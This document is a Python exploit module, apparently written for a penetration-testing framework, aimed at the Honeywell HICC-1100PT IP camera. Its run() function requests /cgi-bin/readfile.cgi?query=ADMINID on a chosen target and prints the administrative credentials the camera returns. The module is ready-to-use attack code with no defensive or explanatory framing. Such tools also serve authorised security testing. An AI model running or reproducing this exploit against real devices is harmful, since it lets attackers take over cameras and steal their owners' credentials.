Description = 'Honeywell IP-Camera HICC-1100PT Password Disclosure'
from plugin_support import *

info = {
        'name': Description,
        'date': '2016-08-18',
        'description': 'Module exploits Honeywell IP-Camera HICC-1100PT Password Dislosure vulnerability. If target is vulnerable '
                        'it is possible to read administrative credentials',
        'authors': [
            'Ryan0x1 <@Ryan0x1>'
        ],
        'references': [
            'https://www.exploit-db.com/exploits/40261/'
        ],
        'devices': [
            'Honeywell IP-Camera HICC-1100PT'
        ],
    }

init = {
    'target':ask.target,
    'RPORT':ask.RPORT
}

def run():
    global init
    import requests, re

    headers = {
        'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
    }

    attack = requests.get("http://" + init['target'] + ":" + init['RPORT'] + "/cgi-bin/readfile.cgi?query=ADMINID", headers=headers)
    if "Not Found" in attack.text:
        pass
    else:
        success("Target appears to be vulnerable")
        warning(attack.text)
        exit()
